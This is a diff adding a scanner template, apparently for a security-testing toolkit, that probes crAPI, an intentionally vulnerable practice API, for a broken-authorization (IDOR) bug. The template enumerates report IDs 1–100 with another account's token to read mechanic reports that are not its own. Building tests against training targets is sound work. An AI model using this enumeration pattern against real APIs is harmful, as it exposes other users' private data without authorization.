@@ -1,0 +1,17 @@
+# Real, live-verified crAPI BOLA — see docs/20-setup-testing-targets.md's
+# crAPI section for the full setup (two throwaway accounts, one submitted
+# mechanic report) and the exact source of the bug (services/workshop/crapi/
+# mechanic/views.py's GetReportView only requires *any* valid JWT, never
+# checking the report belongs to the requesting account).
+id: crapi-mechanic-report-idor
+info:
+  name: crAPI Mechanic Report BOLA
+  author: HackerFive
+  severity: high
+  description: >
+    otherToken can read ownerToken's submitted mechanic report by report_id
+    alone — no ownership check on the endpoint.
+tags:
+  - idor
+requests:
+  - path: "{{BaseURL}}/workshop/api/mechanic/mechanic_report?report_id={{RangeInt(1|100)}}"
